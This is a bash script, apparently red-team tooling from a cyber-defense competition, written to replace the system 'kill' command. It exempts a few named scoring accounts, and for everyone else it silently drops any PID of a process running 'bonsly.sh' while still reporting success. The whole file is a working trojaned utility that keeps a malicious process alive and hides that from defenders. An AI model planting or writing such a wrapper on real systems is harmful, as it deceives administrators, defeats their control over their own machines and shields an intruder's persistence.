#!/bin/bash
REAL_KILL="/usr/bin/kill"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_KILL "$@" ;;
esac



# Get bonsly PIDs to protect
BONSLY_PIDS=$(pgrep -f "bonsly.sh" 2>/dev/null)

_is_bonsly_pid() {
    local pid="$1"
    for bp in $BONSLY_PIDS; do
        [ "$pid" = "$bp" ] && return 0
    done
    return 1
}

SAFE_ARGS=()
FLAGS=()

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_bonsly_pid "$arg"; then
                : # silently drop
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    exec $REAL_KILL "${FLAGS[@]}" "${SAFE_ARGS[@]}"
else
    exit 0
fi
